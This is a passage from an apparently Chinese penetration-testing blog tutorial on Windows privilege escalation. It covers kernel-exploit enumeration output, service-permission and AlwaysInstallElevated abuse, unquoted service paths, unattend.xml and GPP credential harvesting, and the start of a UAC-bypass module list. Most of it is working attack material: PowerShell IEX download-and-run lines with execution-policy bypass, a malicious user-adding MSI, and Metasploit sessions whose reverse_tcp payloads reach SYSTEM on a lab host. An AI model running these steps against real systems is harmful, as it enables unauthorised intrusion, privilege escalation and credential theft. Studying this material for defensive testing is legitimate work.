class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/11199/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Task Scheduler .XML</span><br><span class="line">MSBulletin : MS10-092</span><br><span class="line">CVEID      : 2010-3338, 2010-3888</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/19930/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MSBulletin : MS13-053</span><br><span class="line">CVEID      : 2013-1300</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/33213/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MSBulletin : MS13-081</span><br><span class="line">CVEID      : 2013-3881</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/31576/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : ClientCopyImage Win32k</span><br><span class="line">MSBulletin : MS15-051</span><br><span class="line">CVEID      : 2015-1701, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/37367/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Font Driver Buffer Overflow</span><br><span class="line">MSBulletin : MS15-078</span><br><span class="line">CVEID      : 2015-2426, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/38222/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : &#x27;mrxdav.sys&#x27; WebDAV</span><br><span class="line">MSBulletin : MS16-016</span><br><span class="line">CVEID      : 2016-0051</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/40085/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Secondary Logon Handle</span><br><span class="line">MSBulletin : MS16-032</span><br><span class="line">CVEID      : 2016-0099</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/39719/</span><br><span class="line">VulnStatus : Not Supported on single-core systems</span><br><span class="line"></span><br><span class="line">Title      : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MSBulletin : MS16-034</span><br><span class="line">CVEID      : 2016-0093/94/95/96</span><br><span class="line">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Win32k Elevation of Privilege</span><br><span class="line">MSBulletin : MS16-135</span><br><span class="line">CVEID      : 2016-7255</span><br><span class="line">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Nessus Agent 6.6.2 - 6.10.3</span><br><span class="line">MSBulletin : N/A</span><br><span class="line">CVEID      : 2017-7199</span><br><span class="line">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-windows系统配置错误利用"><a href="#0x02-windows系统配置错误利用" class="headerlink" title="0x02.windows系统配置错误利用"></a>0x02.windows系统配置错误利用</h2><h3 id="1-系统服务权限配置错误"><a href="#1-系统服务权限配置错误" class="headerlink" title="1.系统服务权限配置错误"></a>1.系统服务权限配置错误</h3><blockquote><p>windows server 可创建长久运行的可执行程序，若能获取的修改windows server配置权限， 通过把服务启动的二进制文件替换为恶意二进制文件，可以获得system权限</p><p>服务未运行：使用恶意程序替换，然后重启服务<br>服务正在运行且无法终止：符合绝大多数的漏洞利用场景，使用 DLL劫持技术并尝试重启服务</p></blockquote><h4 id="01-PowerUp-ps1脚本检查服务漏洞"><a href="#01-PowerUp-ps1脚本检查服务漏洞" class="headerlink" title="01.PowerUp.ps1脚本检查服务漏洞"></a>01.PowerUp.ps1脚本检查服务漏洞</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msf的exploit-windows-local-sercice-permissions模块提权"><a href="#02-msf的exploit-windows-local-sercice-permissions模块提权" class="headerlink" title="02.msf的exploit/windows/local/sercice_permissions模块提权"></a>02.msf的exploit/windows/local/sercice_permissions模块提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2956 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;exit</span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/service_permissions </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt;    </span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/service_permissions):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)</span><br><span class="line">   SESSION     1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT     10               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[-] The registry technique will be skipped because the payload architecture does not match the native system architecture</span><br><span class="line">[*] Trying to add a new service...</span><br><span class="line">[*] Created service... CnoKgsk</span><br><span class="line">[+] Service should be started! Enjoy your new SYSTEM meterpreter session.</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49169) at 2021-07-28 09:16:46 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2832 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-注册表键AlwaysInstallElevated提权"><a href="#2-注册表键AlwaysInstallElevated提权" class="headerlink" title="2.注册表键AlwaysInstallElevated提权"></a>2.注册表键AlwaysInstallElevated提权</h3><blockquote><p>原因：开启了windows installer 特权安装功能</p><p>cmd输入gpedit.msc——计算机配置——管理模块——windows组件——windows installer</p><p>cmd输入gpedit.msc——用户配置——管理模块——windows组件——windows installer</p></blockquote><h4 id="01-powerup利用"><a href="#01-powerup利用" class="headerlink" title="01.powerup利用"></a>01.powerup利用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powerup下的Get-RegistryAlwaysInstallElevated模块检查注册表键是否被设置</span><br><span class="line">如果被设置则意味MSI文件是以system权限下能运行</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查是否被设置</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Get-RegistryAlwaysInstallElevated</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行Write-UserAddMSI模块，生成MSI文件</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Write-UserAddMSI</span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行MSI文件</span></span><br><span class="line">msiexec /quiet /qn /i UserAdd.msi</span><br></pre></td></tr></table></figure><img src="/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210728215541363.png" class><h4 id="02-msf的exploit-windows-local-always-install-elevated模块提权"><a href="#02-msf的exploit-windows-local-always-install-elevated模块提权" class="headerlink" title="02.msf的exploit/windows/local/always_install_elevated模块提权"></a>02.msf的exploit/windows/local/always_install_elevated模块提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/service_permissions) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49171) at 2021-07-28 09:43:34 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 936 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-可信任服务路径漏洞"><a href="#3-可信任服务路径漏洞" class="headerlink" title="3.可信任服务路径漏洞"></a>3.可信任服务路径漏洞</h3><blockquote><p>Trusted Service Paths漏洞利用了windows文件路径解析的特性，通俗的说，如果一个服务的可执行文件的路径（带空格）并且没有被双引号引起来，那么这个服务就有漏洞。</p><p>例如：有一个文件路径C:\Program Files\Some Folder\Service.exe，操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。</p><p>本例中会依次尝试执行以下程序：</p><p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe</p><p>如果我们在C盘上传一个名为Program.exe的恶意程序，可能就会以system权限执行该程序，从而达到提权的目的。</p></blockquote><h4 id="01-测试漏洞是否存在"><a href="#01-测试漏洞是否存在" class="headerlink" title="01.测试漏洞是否存在"></a>01.测试漏洞是否存在</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;    #查找没有被引号引起来的服务</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files (x86)&quot;    #检测目标文件夹是否有写权限</span><br><span class="line">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户都具有修改这个文件夹的权限</span><br><span class="line">(M):修改</span><br><span class="line">(F):完全控制</span><br><span class="line">(CI):从属容器将继承访问控制项</span><br><span class="line">(OI):从属文件将继承访问控制项</span><br><span class="line">Everyone:(OI)(CI)(F):对该文件夹，用户有读、写、删除、下载其文件、删除其子目录的权限</span><br><span class="line"></span><br><span class="line">确认存在此漏洞，把要上传的程序重命令并放置在存在此漏洞且可写的目录下，执行如下命令:</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="02-msf利用"><a href="#02-msf利用" class="headerlink" title="02.msf利用"></a>02.msf利用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/trusted_service_path):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; run</span><br><span class="line"></span><br><span class="line">[-] The Windows::WindowsServices mixin is deprecated, use Windows::Services instead</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Finding a vulnerable service...</span><br><span class="line">[-] Exploit failed: NameError undefined local variable or method `service_list&#x27; for #&lt;Msf::Modules::Exploit__Windows__Local__Trusted_service_path::Metasploit3:0x00007fca71a280d0&gt;</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里没有利用成功</span></span><br></pre></td></tr></table></figure><h3 id="4-自动安装配置文件"><a href="#4-自动安装配置文件" class="headerlink" title="4.自动安装配置文件"></a>4.自动安装配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml    #搜索Unatted.xml文件</span><br></pre></td></tr></table></figure><p><code>msf查找</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/enum_unattend </span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_unattend):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   GETALL   true             yes       Collect all unattend.xml that are found</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Reading C:\Windows\panther\unattend.xml</span><br><span class="line">[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_989482.txt</span><br><span class="line">Unattend Credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> Type   Domain  Username        Password  Groups</span><br><span class="line"> ----   ------  --------        --------  ------</span><br><span class="line"> auto           administration</span><br><span class="line"> local          administration</span><br><span class="line"></span><br><span class="line">[+] Unattend Credentials saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_206680.txt</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; </span><br></pre></td></tr></table></figure><h3 id="5-查看计划任务"><a href="#5-查看计划任务" class="headerlink" title="5.查看计划任务"></a>5.查看计划任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><code>AccessChk使用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula    #首次使用接受许可，默认弹框</span><br><span class="line">accesschk.exe -dqv &quot;C:\Windows&quot;    #查看目录权限配置</span><br><span class="line">accesschk.exe -uwdqsUsers&quot;AuthenticatedUsers&quot;c:\*.* #列出某个驱动器下所有权限配置有缺陷的文件</span><br></pre></td></tr></table></figure><h2 id="0x03-组策略首选项提权"><a href="#0x03-组策略首选项提权" class="headerlink" title="0x03.组策略首选项提权"></a>0x03.组策略首选项提权</h2><h3 id="1-获取组策略凭据-SYSVOL-GPP"><a href="#1-获取组策略凭据-SYSVOL-GPP" class="headerlink" title="1.获取组策略凭据(SYSVOL/GPP)"></a>1.获取组策略凭据(SYSVOL/GPP)</h3><h4 id="01-powershell获取cpassword"><a href="#01-powershell获取cpassword" class="headerlink" title="01.powershell获取cpassword"></a>01.powershell获取cpassword</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msf获取"><a href="#02-msf获取" class="headerlink" title="02.msf获取"></a>02.msf获取</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/credentials/gpp </span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/gpp):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   ALL      true             no        Enumerate all domains on network.</span><br><span class="line">   DOMAINS                   no        Enumerate list of space separated domains DOMAINS=&quot;dom1 dom2&quot;.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   STORE    true             no        Store the enumerated files in loot.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Checking for group policy history objects...</span><br><span class="line">[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Checking for SYSVOL locally...</span><br><span class="line">[-] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Enumerating Domains on the Network...</span><br><span class="line">[*] Retrieved Domain(s) JIYE, WORKGROUP from network</span><br><span class="line">[*] Enumerating domain information from the local registry...</span><br><span class="line">[*] Retrieved Domain(s) JIYE from registry</span><br><span class="line">[*] Retrieved DC DC.JIYE.NET from registry</span><br><span class="line">[*] Enumerating DCs for JIYE on the network...</span><br><span class="line">[-] No Domain Controllers found for JIYE</span><br><span class="line">[*] Searching for Policy Share on DC.JIYE.NET...</span><br><span class="line">[-] Error accessing \\DC.JIYE.NET\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.</span><br><span class="line">[*] Searching for Group Policy XML Files...</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x04-UAC绕过提权-msf"><a href="#0x04-UAC绕过提权-msf" class="headerlink" title="0x04.UAC绕过提权(msf)"></a>0x04.UAC绕过提权(msf)</h2><blockquote><p>使用前提：</p><p>一是系统当前用户必须在管理员组中<br>二是用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我”</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br><span class="line">2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">3   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">4   